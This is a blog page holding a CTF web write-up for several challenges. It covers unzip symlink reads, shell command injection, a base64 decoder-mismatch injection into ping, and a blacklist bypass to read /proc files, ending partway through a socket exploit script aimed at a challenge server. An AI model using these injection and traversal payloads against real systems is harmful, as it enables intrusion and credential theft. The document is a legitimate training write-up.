@@ -1,0 +1,385 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="前言web五题出了四题，大体难度适中，最后一道xss坐一天牢也没出，尽力了   online_unzipper该题很快实现任意文件读取之后拿到key打unzip软链接实现任意读读&#x2F;proc&#x2F;1&#x2F;environkey&#x3D;#mu0cw9F#7bBCoF! 再之后可以控制zip_path打命令注入拿到key之后可以伪造admin，可以实现 12345678910111213if role &#x3D;&#x3D;">
+<meta property="og:type" content="article">
+<meta property="og:title" content="n1juniorCTF-web-WP">
+<meta property="og:url" content="https://hexo.sheep-sys-sudo.top/n1CTF-web-WP/index.html">
+<meta property="og:site_name" content="Sh_eePpppのHEXO">
+<meta property="og:description" content="前言web五题出了四题，大体难度适中，最后一道xss坐一天牢也没出，尽力了   online_unzipper该题很快实现任意文件读取之后拿到key打unzip软链接实现任意读读&#x2F;proc&#x2F;1&#x2F;environkey&#x3D;#mu0cw9F#7bBCoF! 再之后可以控制zip_path打命令注入拿到key之后可以伪造admin，可以实现 12345678910111213if role &#x3D;&#x3D;">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://sheep321.oss-cn-qingdao.aliyuncs.com/img1/20250913214453798.png">
+<meta property="og:image" content="https://sheep321.oss-cn-qingdao.aliyuncs.com/img1/20250913214802658.png">
+<meta property="og:image" content="https://sheep321.oss-cn-qingdao.aliyuncs.com/img1/20250914215732395.png">
+<meta property="og:image" content="https://sheep321.oss-cn-qingdao.aliyuncs.com/img1/20250914215838764.png">
+<meta property="og:image" content="https://sheep321.oss-cn-qingdao.aliyuncs.com/img1/20251026113335686.png">
+<meta property="article:published_time" content="2025-09-16T23:59:27.000Z">
+<meta property="article:modified_time" content="2025-10-26T03:37:05.239Z">
+<meta property="article:author" content="Sh_eePppp">
+<meta property="article:tag" content="n1-junior">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://sheep321.oss-cn-qingdao.aliyuncs.com/img1/20250913214453798.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>n1juniorCTF-web-WP</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 7.3.0"><link rel="alternate" href="/atom.xml" title="Sh_eePpppのHEXO" type="application/atom+xml">
+<link rel="stylesheet" href="/css/prism-okaidia.css" type="text/css">
+<link rel="stylesheet" href="/css/prism-line-numbers.css" type="text/css"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="顶部" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">h0me</a></li><!--
+     --><!--
+       --><li><a href="/categories">Categ0r1es</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Artic1es</a></li><!--
+     --><!--
+       --><li><a href="/links/">L1nks</a></li><!--
+     --><!--
+       --><li><a href="/search/">Searh</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="上一篇" href="/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="下一篇" href="/fastjson%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="返回顶部" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="分享文章" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享文章</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://hexo.sheep-sys-sudo.top/n1CTF-web-WP/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://hexo.sheep-sys-sudo.top/n1CTF-web-WP/&text=n1juniorCTF-web-WP"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://hexo.sheep-sys-sudo.top/n1CTF-web-WP/&title=n1juniorCTF-web-WP"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://hexo.sheep-sys-sudo.top/n1CTF-web-WP/&is_video=false&description=n1juniorCTF-web-WP"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=n1juniorCTF-web-WP&body=Check out this article: https://hexo.sheep-sys-sudo.top/n1CTF-web-WP/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://hexo.sheep-sys-sudo.top/n1CTF-web-WP/&title=n1juniorCTF-web-WP"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://hexo.sheep-sys-sudo.top/n1CTF-web-WP/&title=n1juniorCTF-web-WP"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://hexo.sheep-sys-sudo.top/n1CTF-web-WP/&title=n1juniorCTF-web-WP"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://hexo.sheep-sys-sudo.top/n1CTF-web-WP/&title=n1juniorCTF-web-WP"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://hexo.sheep-sys-sudo.top/n1CTF-web-WP/&name=n1juniorCTF-web-WP&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://hexo.sheep-sys-sudo.top/n1CTF-web-WP/&t=n1juniorCTF-web-WP"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#online-unzipper"><span class="toc-number">2.</span> <span class="toc-text">online_unzipper</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ping"><span class="toc-number">3.</span> <span class="toc-text">ping</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Peek-a-Fork"><span class="toc-number">4.</span> <span class="toc-text">Peek a Fork</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%9E%E7%8E%B0%E4%BB%BB%E6%84%8F%E8%AF%BB"><span class="toc-number">4.1.</span> <span class="toc-text">实现任意读</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%8E%E5%86%85%E5%AD%98%E4%B8%AD%E8%AF%BBflag"><span class="toc-number">4.2.</span> <span class="toc-text">从内存中读flag</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Unfinished"><span class="toc-number">5.</span> <span class="toc-text">Unfinished</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#safenotes"><span class="toc-number">6.</span> <span class="toc-text">safenotes</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%86%E6%9E%90"><span class="toc-number">6.1.</span> <span class="toc-text">分析</span></a></li></ol></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        n1juniorCTF-web-WP
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">Sh_eePppp</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2025-09-16T23:59:27.000Z" class="dt-published" itemprop="datePublished">2025-09-17</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fa-solid fa-archive"></i>
+        <a class="category-link" href="/categories/web/">web</a> › <a class="category-link" href="/categories/web/WP/">WP</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/n1-junior/" rel="tag">n1-junior</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>web五题出了四题，大体难度适中，最后一道xss坐一天牢也没出，尽力了  </p>
+<h2 id="online-unzipper"><a href="#online-unzipper" class="headerlink" title="online_unzipper"></a>online_unzipper</h2><p>该题很快实现任意文件读取之后拿到key<br>打unzip软链接实现任意读<br>读<code>/proc/1/environ</code><br>key&#x3D;<code>#mu0cw9F#7bBCoF! </code><br>再之后可以控制zip_path打命令注入<br>拿到key之后可以伪造admin，可以实现</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> role == <span class="string">&quot;admin&quot;</span>:</span><br><span class="line">            dirname = request.form.get(<span class="string">&quot;dirname&quot;</span>) <span class="keyword">or</span> <span class="built_in">str</span>(uuid.uuid4())</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    dirname = <span class="built_in">str</span>(uuid.uuid4())</span><br><span class="line"></span><br><span class="line">target_dir = os.path.join(UPLOAD_FOLDER, dirname)</span><br><span class="line">os.makedirs(target_dir, exist_ok=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">zip_path = os.path.join(target_dir, <span class="string">&quot;upload.zip&quot;</span>)</span><br><span class="line">file.save(zip_path)</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    os.system(<span class="string">f&quot;unzip -o <span class="subst">&#123;zip_path&#125;</span> -d <span class="subst">&#123;target_dir&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure></div>
+<p>可以打命令注入  </p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SHELL"><figure class="iseeu highlight /shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">;`echo $(cat /flag-ChdT5OSKiNAjAgl4lI7m3EwRcfPuRGFR.txt) &gt; /app/111`</span><br></pre></td></tr></table></figure></div>
+<p>然后软链接读</p>
+<h2 id="ping"><a href="#ping" class="headerlink" title="ping"></a>ping</h2><p>看看源码</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> ipaddress</span><br><span class="line"><span class="keyword">import</span> flask</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">run_ping</span>(<span class="params">ip_base64</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        decoded_ip = base64.b64decode(ip_base64).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> re.<span class="keyword">match</span>(<span class="string">r&#x27;^\d+\.\d+\.\d+\.\d+$&#x27;</span>, decoded_ip):</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="keyword">if</span> decoded_ip.count(<span class="string">&#x27;.&#x27;</span>) != <span class="number">3</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">all</span>(<span class="number">0</span> &lt;= <span class="built_in">int</span>(part) &lt; <span class="number">256</span> <span class="keyword">for</span> part <span class="keyword">in</span> decoded_ip.split(<span class="string">&#x27;.&#x27;</span>)):</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> ipaddress.ip_address(decoded_ip):</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(decoded_ip) &gt; <span class="number">15</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> re.<span class="keyword">match</span>(<span class="string">r&#x27;^[A-Za-z0-9+/=]+$&#x27;</span>, ip_base64):</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    command = <span class="string">f&quot;&quot;&quot;echo &quot;ping -c 1 $(echo &#x27;<span class="subst">&#123;ip_base64&#125;</span>&#x27; | base64 -d)&quot; | sh&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        process = subprocess.run(</span><br><span class="line">            command,</span><br><span class="line">            shell=<span class="literal">True</span>,</span><br><span class="line">            check=<span class="literal">True</span>,</span><br><span class="line">            capture_output=<span class="literal">True</span>,</span><br><span class="line">            text=<span class="literal">True</span></span><br><span class="line">        )</span><br><span class="line">        <span class="keyword">return</span> process.stdout</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">app = flask.Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/ping&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ping</span>():</span><br><span class="line">    data = flask.request.json</span><br><span class="line">    ip_base64 = data.get(<span class="string">&#x27;ip_base64&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> ip_base64:</span><br><span class="line">        <span class="keyword">return</span> flask.jsonify(&#123;<span class="string">&#x27;error&#x27;</span>: <span class="string">&#x27;no ip&#x27;</span>&#125;), <span class="number">400</span></span><br><span class="line"></span><br><span class="line">    result = run_ping(ip_base64)</span><br><span class="line">    <span class="keyword">if</span> result:</span><br><span class="line">        <span class="keyword">return</span> flask.jsonify(&#123;<span class="string">&#x27;success&#x27;</span>: <span class="literal">True</span>, <span class="string">&#x27;output&#x27;</span>: result&#125;), <span class="number">200</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> flask.jsonify(&#123;<span class="string">&#x27;success&#x27;</span>: <span class="literal">False</span>&#125;), <span class="number">400</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> flask.render_template(<span class="string">&#x27;index.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line">app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">5000</span>)</span><br></pre></td></tr></table></figure></div>
+<p>这里利用的是二者的解析差异  </p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAINTEXT"><figure class="iseeu highlight /plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">base64.b64decode到=解码就停止了 </span><br><span class="line">当使用 base64 -d 解码时，解码器会正确地处理这些填充符 =，遇到它们不会报错或停止，而是将其作为正常编码的一部分进行解析，完成解码后输出最终结果</span><br></pre></td></tr></table></figure></div>
+<p>最终就是<br>127.0.0.11-&gt;MTI3LjAuMC4xMQ&#x3D;&#x3D;<br>cat &#x2F;flag-&gt;O2NhdCAvZmxhZw&#x3D;&#x3D;<br>合二为一</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAINTEXT"><figure class="iseeu highlight /plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">MTI3LjAuMC4xMQ==O2NhdCAvZmxhZw==即可</span><br></pre></td></tr></table></figure></div>
+<p><img src="https://sheep321.oss-cn-qingdao.aliyuncs.com/img1/20250913214453798.png"><br><img src="https://sheep321.oss-cn-qingdao.aliyuncs.com/img1/20250913214802658.png"><br>flag{bAse64_15_DIffER3N7_IN_LInUX_anD_pytH0N_iFrJf}</p>
+<h2 id="Peek-a-Fork"><a href="#Peek-a-Fork" class="headerlink" title="Peek a Fork"></a>Peek a Fork</h2><p><em>分为两步，一个实现任意文件读取，另一个实现内存读flag</em></p>
+<h3 id="实现任意读"><a href="#实现任意读" class="headerlink" title="实现任意读"></a>实现任意读</h3><p>看源码，发现黑名单  </p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAINTEXT"><figure class="iseeu highlight /plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">FORBIDDEN = [b&#x27;flag&#x27;, b&#x27;proc&#x27;, b&#x27;&lt;&#x27;, b&#x27;&gt;&#x27;, b&#x27;^&#x27;, b&quot;&#x27;&quot;, b&#x27;&quot;&#x27;, b&#x27;..&#x27;, b&#x27;./&#x27;]</span><br></pre></td></tr></table></figure></div>
+<p>审码的时候发现这里有    </p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">path = request_data.split(<span class="string">b&#x27; &#x27;</span>)[<span class="number">1</span>]</span><br><span class="line">pattern = <span class="string">rb&#x27;\?offset=(\d+)&amp;length=(\d+)&#x27;</span></span><br><span class="line"></span><br><span class="line">offset = <span class="number">0</span></span><br><span class="line">length = -<span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">match</span> = re.search(pattern, path)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">match</span>:</span><br><span class="line">    offset = <span class="built_in">int</span>(<span class="keyword">match</span>.group(<span class="number">1</span>).decode())</span><br><span class="line">    length = <span class="built_in">int</span>(<span class="keyword">match</span>.group(<span class="number">2</span>).decode())</span><br><span class="line">    </span><br><span class="line">    clean_path = re.sub(pattern, <span class="string">b&#x27;&#x27;</span>, path)</span><br><span class="line">    filename = clean_path.strip(<span class="string">b&#x27;/&#x27;</span>).decode()</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    filename = path.strip(<span class="string">b&#x27;/&#x27;</span>).decode()</span><br></pre></td></tr></table></figure></div>
+<p>即，匹配到<code>?offset=(\d+)&amp;length=(\d+)</code>就会把这个删掉<br>本地测了一下能读flag.txt<br><code>/f?offset=0&amp;length=100lag.txt</code><br>如何实现跨目录呢?我们就插多个  </p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAINTEXT"><figure class="iseeu highlight /plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/.?offset=0&amp;length=100.?offset=0&amp;length=100/pro?offset=0&amp;length=100c/self/environ</span><br></pre></td></tr></table></figure></div>
+<p>成功读取</p>
+<h3 id="从内存中读flag"><a href="#从内存中读flag" class="headerlink" title="从内存中读flag"></a>从内存中读flag</h3><p>比较把flag.txt删了，把flag存进内存里<br>我们如何利用呢?<br>源码中还有一个log<br>我们知道，子进程继承父进程的内存映射，包括包含flag的mmap<br>即利用间隙填充Log，那道含有flag的内存<br>关键看下面这个脚本<br>脚本如下</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exploit</span>():</span><br><span class="line">    target_ip = <span class="string">&#x27;60.205.163.215&#x27;</span></span><br><span class="line">    target_port = <span class="number">14831</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 第一步：创建长时间运行的子进程</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[1] 创建长时间运行的子进程...&quot;</span>)</span><br><span class="line">    s1 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    s1.connect((target_ip, target_port))</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 发送长时间运行的请求</span></span><br><span class="line">    long_request = <span class="string">b&quot;GET /?log=1&amp;factor=10000000000000 HTTP/1.1\r\nHost: localhost\r\n\r\n&quot;</span></span><br><span class="line">    s1.sendall(long_request)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 等待一下确保子进程已经fork</span></span><br><span class="line">    <span class="keyword">import</span> time</span><br><span class="line">    time.sleep(<span class="number">2</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 第二步：获取进程状态</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[2] 获取进程状态...&quot;</span>)</span><br><span class="line">    s2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    s2.connect((target_ip, target_port))</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 使用绕过技巧获取status</span></span><br><span class="line">    status_request = <span class="string">b&quot;GET /.?offset=0&amp;length=500.?offset=0&amp;length=500/pro?offset=0&amp;length=500c/self/status HTTP/1.1\r\nHost: localhost\r\n\r\n&quot;</span></span><br><span class="line">    s2.sendall(status_request)</span><br><span class="line">    </span><br><span class="line">    status_response = <span class="string">b&quot;&quot;</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        data = s2.recv(<span class="number">4096</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> data:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        status_response += data</span><br><span class="line">    </span><br><span class="line">    